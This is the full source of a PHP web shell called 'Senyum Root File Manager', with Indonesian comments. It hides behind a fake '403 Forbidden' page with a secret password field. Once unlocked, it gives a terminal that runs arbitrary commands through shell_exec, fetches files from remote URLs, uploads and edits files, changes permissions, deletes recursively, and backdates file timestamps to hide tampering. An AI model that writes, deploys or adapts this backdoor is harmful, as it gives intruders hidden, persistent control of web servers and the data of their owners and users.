<?php
session_start();

// Ganti dengan hash password Anda yang dibuat dengan password_hash()
$password_hash = '$2y$10$OOgHgeTlsLZP1GZsg6Wdf.fbKbwOURhkTLNOhPzcXcAnACWNV8AsO';

$loggedIn = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// Proses login
if (isset($_POST['login_pass'])) {
    if (password_verify($_POST['login_pass'], $password_hash)) {
        $_SESSION['logged_in'] = true;
        header('Location: ?');
        exit;
    } else {
        $error = "Incorrect password.";
    }
}

// Jika belum login, tampilkan halaman 403 Forbidden
if (!$loggedIn) {
    header('HTTP/1.0 403 Forbidden');
    ?>
    <!DOCTYPE html>
    <html><head><title>403 Forbidden</title></head>
    <body style="background:#111;color:#eee;font-family:monospace;text-align:center;margin-top:100px;">
        <h1>403 Forbidden</h1>
        <p>Access Denied</p>
        <form method="post">
            <input type="password" name="login_pass" placeholder="Enter Password" style="padding:10px;background:#222;color:#fff;border:1px solid #444;">
            <button type="submit" style="padding:10px;">Login</button>
        </form>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
    </body></html>
    <?php
    exit;
}

// --- FUNGSI BANTU (HELPERS) ---

define('REMOTE_DL_TOKEN','cyber2025');

function __download_secure($url, $optname=''){
  $base = isset($_GET['path']) && is_dir($_GET['path']) ? realpath($_GET['path']) : getcwd();
  if (!is_dir($base)) $base = getcwd();
  $cwdBackup = getcwd();
  @chdir($base);

  if (!filter_var($url, FILTER_VALIDATE_URL))
    return ['ok'=>false,'err'=>'Invalid URL','path'=>null];

  $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'file.bin');
  $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
  $filename = $optname
    ? preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname))
    : $basename;

  $target = $base . DIRECTORY_SEPARATOR . $filename;
  $ok=false;$err='';

  if (function_exists('curl_init')) {
    $ch=curl_init($url);$fp=@fopen($target,'w');
    if($fp){
      curl_setopt_array($ch,[
        CURLOPT_FILE=>$fp,
        CURLOPT_FOLLOWLOCATION=>true,
        CURLOPT_TIMEOUT=>90,
        CURLOPT_FAILONERROR=>true
      ]);
      curl_exec($ch);
      $cerr=curl_error($ch);
      $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
      curl_close($ch);fclose($fp);
      if(!$cerr && $code<400 && is_file($target)) $ok=true;
      else{@unlink($target);$err=$cerr?:("HTTP ".$code);}
    }else $err='Write fail';
  }

  if(!$ok){
    $data=@file_get_contents($url);
    if($data!==false && @file_put_contents($target,$data)!==false)
      $ok=true;
    else $err=$err?:'Download failed';
  }

  if($ok)@chmod($target,0644);
  @chdir($cwdBackup);
  return ['ok'=>$ok,'err'=>$err,'path'=>$target];
}

// Fungsi untuk menghapus folder dan isinya secara rekursif
function delete_recursive($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// Fungsi untuk menambahkan folder ke dalam file Zip secara rekursif
function add_folder_to_zip($folder, &$zip, $exclusive_length) {
    $handle = opendir($folder);
    while (false !== $f = readdir($handle)) {
        if ($f != '.' && $f != '..') {
            $filePath = "$folder/$f";
            $localPath = substr($filePath, $exclusive_length);
            if (is_file($filePath)) {
                $zip->addFile($filePath, $localPath);
            } elseif (is_dir($filePath)) {
                $zip->addEmptyDir($localPath);
                add_folder_to_zip($filePath, $zip, $exclusive_length);
            }
        }
    }
    closedir($handle);
}

// Fungsi untuk mendapatkan izin file dalam format numerik (misal: 0755)
function perms($p) {
    return substr(sprintf('%o', $p), -4);
}

// [FIXED] Fungsi untuk membuat tautan path navigasi (breadcrumbs)
// Didesain ulang agar kompatibel dengan Windows dan Linux
function make_path_links($current_path) {
    $path = str_replace('\\', '/', $current_path); // Standarisasi ke forward slash
    $parts = explode('/', trim($path, '/'));
    $output = '';
    $built_path = '';

    // Cek apakah ini path Windows (misal: "D:") atau Linux (root "/")
    if (preg_match('/^[a-zA-Z]:$/', $parts[0])) { // Windows path
        $drive = array_shift($parts);
        $built_path = $drive . '/';
        $output .= '<a href="?path=' . urlencode($built_path) . '">' . htmlspecialchars($drive) . '</a>';
    } else { // Linux path
        $built_path = '/';
        $output .= '<a href="?path=/">/</a>';
    }
    
    // Bangun sisa path
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $built_path .= $part . '/';
        $output .= '<a href="?path=' . urlencode(rtrim($built_path, '/')) . '">' . htmlspecialchars($part) . '</a>' . '/';
    }
    
    return rtrim($output, '/');
}


// --- LOGIKA UTAMA & PEMROSESAN AKSI ---

// Redirect ke path awal jika tidak ada parameter
if (!isset($_GET['path'])) {
    $default = realpath($_SERVER['DOCUMENT_ROOT']);
    $default = str_replace('\\', '/', $default); // Standarisasi path
    header('Location: ?path=' . urlencode($default));
    exit;
}

$path = realpath($_GET['path']);
$path = $path ? str_replace('\\', '/', $path) : null; // Standarisasi path
if (!$path || !is_dir($path)) die("Access denied or invalid path.");

$msg = '';
$term_output = '';
$edit_file = '';
$edit_content = '';
$zip_enabled = class_exists('ZipArchive');

// --- ACTION HANDLERS (PENANGANAN AKSI) ---

if (isset($_POST['dl_submit'])) {
    $cmd=trim($_POST['cmd']);$t=$_POST['dl_token'];
    if($t!==REMOTE_DL_TOKEN){
        $msg = "Auth failed.";
    } else {
        $p=preg_split('/\s+/',$cmd,3);
        if(count($p)<2||strtolower($p[0])!=='download'){
            $msg = "Use: download &lt;url&gt; [filename]";
        } else {
            $r=__download_secure($p[1],$p[2]??'');
            $msg = $r['ok']
              ? "Success: ".htmlspecialchars(basename($r['path']))
              : "Error: ".htmlspecialchars($r['err']);
        }
    }
}

// Create Folder
if (isset($_POST['new_folder'])) {
    $folder_name = trim($_POST['new_folder']);
    if ($folder_name !== '' && preg_match('/^[a-zA-Z0-9_\- ]+$/', $folder_name)) {
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            $msg = mkdir($new_folder_path, 0755) ? "Folder created: " . htmlspecialchars($folder_name) : "Failed to create folder.";
        } else {
            $msg = "Folder already exists.";
        }
    } else {
        $msg = "Invalid folder name.";
    }
}

// Create File
if (isset($_POST['new_file'])) {
    $file_name = trim($_POST['new_file']);
    if ($file_name !== '' && preg_match('/^[a-zA-Z0-9_\-\.]+$/', $file_name)) {
        $new_file_path = $path . '/' . $file_name;
        if (!file_exists($new_file_path)) {
            $msg = file_put_contents($new_file_path, '') !== false ? "File created: " . htmlspecialchars($file_name) : "Failed to create file.";
        } else {
            $msg = "File already exists.";
        }
    } else {
        $msg = "Invalid file name.";
    }
}

// Upload File
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $target = $path . '/' . basename($_FILES['upload_file']['name']);
    $msg = move_uploaded_file($_FILES['upload_file']['tmp_name'], $target) ? "File uploaded." : "Upload failed.";
}

// Edit file
if (isset($_POST['edit_file'], $_POST['edit_data'])) {
    $f = realpath($path . '/' . $_POST['edit_file']);
    if ($f && is_file($f)) {
        $msg = file_put_contents($f, $_POST['edit_data']) !== false ? "File saved." : "Failed to save file.";
    } else {
        $msg = "Invalid file.";
    }
}

// Chmod
if (isset($_POST['chmod_file'], $_POST['chmod_value'])) {
    $f = realpath($path . '/' . $_POST['chmod_file']);
    if ($f && file_exists($f)) {
        $perm = intval($_POST['chmod_value'], 8);
        $msg = @chmod($f, $perm) ? "Permissions changed." : "Failed to change permissions.";
    }
}

// Rename
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    $old = realpath($path . '/' . $_POST['rename_old']);
    $new = $path . '/' . basename($_POST['rename_new']);
    if ($old && strpos(str_replace('\\', '/', $old), $path) === 0) {
        $msg = @rename($old, $new) ? "Renamed successfully." : "Failed to rename.";
    } else {
        $msg = "Invalid rename target.";
    }
}

// Touch file
if (isset($_POST['touch_file'], $_POST['touch_time_string'])) {
    $file_to_touch = realpath($path . '/' . $_POST['touch_file']);
    $time = strtotime($_POST['touch_time_string']);
    if ($file_to_touch && file_exists($file_to_touch) && $time !== false) {
        $msg = touch($file_to_touch, $time) ? "Timestamp updated." : "Failed to update timestamp.";
    } else {
        $msg = "Invalid file or time format. Use YYYY-MM-DD HH:MM:SS.";
    }
}

// [NEW] Unzip
if ($zip_enabled && isset($_POST['unzip_file'])) {
    $zip_path = realpath($path . '/' . $_POST['unzip_file']);
    if ($zip_path && is_file($zip_path) && strtolower(pathinfo($zip_path, PATHINFO_EXTENSION)) == 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            $msg = 'File unzipped successfully.';
        } else {
            $msg = 'Failed to unzip file.';
        }
    } else {
        $msg = 'Invalid zip file.';
    }
}

// [NEW] Bulk Delete
if (isset($_POST['bulk_delete']) && !empty($_POST['selected_items'])) {
    $count = 0;
    foreach ($_POST['selected_items'] as $item) {
        $target = realpath($path . '/' . $item);
        if ($target && strpos(str_replace('\\', '/', $target), $path) === 0) {
            if (delete_recursive($target)) {
                $count++;
            }
        }
    }
    $msg = "$count items deleted.";
}

// [NEW] Bulk Zip
if ($zip_enabled && isset($_POST['bulk_zip']) && !empty($_POST['selected_items'])) {
    $zip_name = !empty($_POST['zip_filename']) ? basename($_POST['zip_filename']) : 'archive.zip';
    if (strtolower(pathinfo($zip_name, PATHINFO_EXTENSION)) != 'zip') $zip_name .= '.zip';
    $zip_path = $path . '/' . $zip_name;

    if (!file_exists($zip_path)) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['selected_items'] as $item) {
                $full_path = realpath($path . '/' . $item);
                if (!$full_path) continue;
                $full_path = str_replace('\\', '/', $full_path);

                if (is_file($full_path)) {
                    $zip->addFile($full_path, basename($full_path));
                } elseif (is_dir($full_path)) {
                    add_folder_to_zip($full_path, $zip, strlen($path . '/'));
                }
            }
            $zip->close();
            $msg = "Selected items zipped into " . htmlspecialchars($zip_name);
        } else {
            $msg = "Failed to create zip archive.";
        }
    } else {
        $msg = "Zip file already exists: " . htmlspecialchars($zip_name);
    }
}


// Terminal
if (!empty($_POST['terminal_cmd'])) {
    $cmd = $_POST['terminal_cmd'];
    $term_output = shell_exec("cd " . escapeshellarg($path) . " && $cmd 2>&1") ?? "Command failed.";
}

// Load for editing
if (isset($_GET['edit'])) {
    $edit_file = basename($_GET['edit']);
    $target = realpath($path . '/' . $edit_file);
    if ($target && is_file($target) && strpos(str_replace('\\', '/', $target), $path) === 0) {
        $edit_content = file_get_contents($target);
    } else {
        $edit_file = '';
        $msg = "Cannot open file.";
    }
}

// --- FILE & FOLDER LISTING ---
$raw_items = @scandir($path) ?: [];
$items = array_diff($raw_items, ['.', '..']);

$folders = [];
$files = [];
foreach ($items as $item) {
    if (is_dir($path . '/' . $item)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}
sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$items = array_merge($folders, $files);

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Senyum Root File Manager</title>
    <style>
        body { font-family: monospace; background: #1c1c1c; color: #ddd; max-width: 1400px; margin: auto; padding: 20px; }
        a { color: #4fc3f7; text-decoration: none; }
        a:hover { text-decoration: underline; }
        p a { margin-right: 4px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px 10px; border-bottom: 1px solid #444; text-align: left; vertical-align: middle; }
        input, textarea, button, select { font-family: monospace; background: #333; color: #eee; border: 1px solid #555; padding: 5px; border-radius: 3px; }
        button { cursor: pointer; background: #444; }
        button:hover { background: #555; }
        textarea { width: 100%; height: 300px; box-sizing: border-box; }
        .msg { background: #2e7d32; padding: 10px; color: #c8e6c9; margin-bottom: 15px; border-left: 5px solid #4caf50; }
        .terminal { background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; border: 1px solid #0f0; margin-top: 10px; min-height: 50px; }
        form.inline { display: inline-block; vertical-align: middle; margin: 2px 5px 2px 0; }
        td.actions { white-space: normal; }
        .bulk-actions { margin-top: 15px; padding: 10px; background: #222; border-radius: 4px; }
        .remote-dl-form { background: #0b0b10; padding: 14px; border-radius: 8px; margin: 15px auto; max-width: 950px; box-shadow: 0 0 10px rgba(110,70,255,0.3); }
    </style>
</head>
<body>

<h2>Senyum File Manager</h2>
<p>Directory: <?= make_path_links($path) ?></p>
<?php if ($msg): ?><div class="msg"><?= htmlspecialchars($msg) ?></div><?php endif; ?>

<div style="margin-bottom: 20px; display:flex; flex-wrap:wrap; gap:10px;">
    <form method="post"><input type="text" name="new_folder" placeholder="New folder"><button type="submit">Create</button></form>
    <form method="post"><input type="text" name="new_file" placeholder="New file"><button type="submit">Create</button></form>
    <form method="post" enctype="multipart/form-data"><input type="file" name="upload_file" required><button type="submit">Upload</button></form>
</div>

<!-- Added remote download form section -->
<div class="remote-dl-form">
    <h3>Download From URL</h3>
    <form method="post">
        <label>Command (download &lt;url&gt; [filename])</label><br>
        <input type="text" name="cmd" placeholder="download https://example.com/file.ext optional_name.ext" style="width:95%;max-width:900px;padding:10px 12px;border-radius:6px;background:#0b0b18;color:#bfefff;border:1px solid rgba(160,90,255,0.4);font-family:monospace;font-size:14px;" required>
        <input type="hidden" name="dl_token" value="<?= REMOTE_DL_TOKEN ?>">
        <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
        <div style="margin-top:8px;"><button type="submit" name="dl_submit">Download</button></div>
    </form>
    <div style="color:#888;font-size:12px;margin-top:8px;">Current dir: <?= htmlspecialchars($path) ?></div>
</div>

<h3>Terminal</h3>
<form method="post">
    <input type="text" name="terminal_cmd" placeholder="e.g. ls -la" style="width: 80%" autofocus>
    <button type="submit">Run</button>
</form>
<div class="terminal"><?= htmlspecialchars($term_output ?: "Terminal output here.") ?></div>

<hr style="border-color:#444; margin: 20px 0;">

<form method="post" id="bulk-form">
<table>
    <tr>
        <th><input type="checkbox" onclick="toggle(this);"></th>
        <th>Name</th>
        <th>Size</th>
        <th>Perms</th>
        <th>Actions</th>
    </tr>
    <?php foreach ($items as $i):
        $fp = $path . '/' . $i;
        $is_dir = is_dir($fp);
        $perms = perms(@fileperms($fp));
        $color = is_writable($fp) ? 'lightgreen' : 'tomato';
        
        echo "<tr>";
        // Checkbox
        echo "<td><input type='checkbox' name='selected_items[]' value='".htmlspecialchars($i)."'></td>";
        
        // Name
        echo "<td>";
        if ($is_dir) {
            echo "<a href='?path=" . urlencode($fp) . "' style='color:limegreen; font-weight:bold;'>" . htmlspecialchars($i) . "/</a>";
        } else {
            echo "<a href='?path=" . urlencode($path) . "&edit=" . urlencode($i) . "' style='color:khaki;'>" . htmlspecialchars($i) . "</a>";
        }
        echo "</td>";

        // Size & Perms
        echo "<td>" . ($is_dir ? 'Dir' : number_format(@filesize($fp))) . "</td>";
        echo "<td style='color:$color;'>$perms</td>";
        
        // Actions
        echo "<td class='actions'>";
            // Unzip Form
            if (!$is_dir && $zip_enabled && strtolower(pathinfo($fp, PATHINFO_EXTENSION)) == 'zip') {
                echo "<form method='post' class='inline'>
                        <input type='hidden' name='unzip_file' value='".htmlspecialchars($i)."'>
                        <button type='submit' style='color:yellow;'>unzip</button>
                      </form>";
            }
            
            // Chmod Form
            echo "<form method='post' class='inline'>
                    <input type='hidden' name='chmod_file' value='".htmlspecialchars($i)."'>
                    <input type='text' name='chmod_value' value='".substr($perms,-3)."' size='4' title='chmod'>
                    <button type='submit'>chmod</button>
                  </form>";
            
            // Rename Form
            echo "<form method='post' class='inline'>
                    <input type='hidden' name='rename_old' value='".htmlspecialchars($i)."'>
                    <input type='text' name='rename_new' value='".htmlspecialchars($i)."' size='20' required>
                    <button type='submit'>rename</button>
                  </form>";

            // Touch Form
            $mtime_string = date("Y-m-d H:i:s", @filemtime($fp));
            echo "<form method='post' class='inline'>
                    <input type='hidden' name='touch_file' value='".htmlspecialchars($i)."'>
                    <input type='text' name='touch_time_string' value='".$mtime_string."' size='19' title='Set timestamp YYYY-MM-DD HH:MM:SS'>
                    <button type='submit'>set time</button>
                  </form>";
            
            // Delete Form (single)
            echo "<form method='post' class='inline' onsubmit=\"return confirm('Delete ".htmlspecialchars($i)."?');\">
                    <input type='hidden' name='delete_target' value='".htmlspecialchars($i)."'>
                    <button type='submit' style='color:tomato;'>delete</button>
                  </form>";
        echo "</td>";

    echo "</tr>";
    endforeach; ?>
</table>

<div class="bulk-actions">
    <strong>With Selected:</strong>
    <button type="submit" name="bulk_delete" onclick="return confirm('Are you sure you want to delete all selected items? This is irreversible.');" style="color:tomato;">Delete Selected</button>
    <?php if ($zip_enabled): ?>
    <span style="margin-left: 15px;">
        <input type="text" name="zip_filename" placeholder="archive.zip" size="20">
        <button type="submit" name="bulk_zip" onclick="return confirm('Create a zip with selected items?');">Zip Selected</button>
    </span>
    <?php else: ?>
    <span style="margin-left:15px; color: #aaa;">(Zip/Unzip disabled: PHP ZipArchive extension not found)</span>
    <?php endif; ?>
</div>
</form>

<?php if ($edit_file): ?>
<hr style="border-color:#444; margin: 20px 0;">
<h3>Editing: <?= htmlspecialchars($edit_file) ?></h3>
<form method="post">
    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
    <textarea name="edit_data"><?= htmlspecialchars($edit_content) ?></textarea><br>
    <button type="submit">Save</button>
    <a href="?path=<?= urlencode($path) ?>" style="display:inline-block; padding: 5px; background:#444; border-radius:3px; margin-left:10px;">Cancel</a>
</form>
<?php endif; ?>

<script>
// Javascript untuk toggle all checkboxes
function toggle(source) {
    checkboxes = document.getElementsByName('selected_items[]');
    for(var i=0, n=checkboxes.length; i<n; i++) {
        checkboxes[i].checked = source.checked;
    }
}
</script>

</body>
</html>
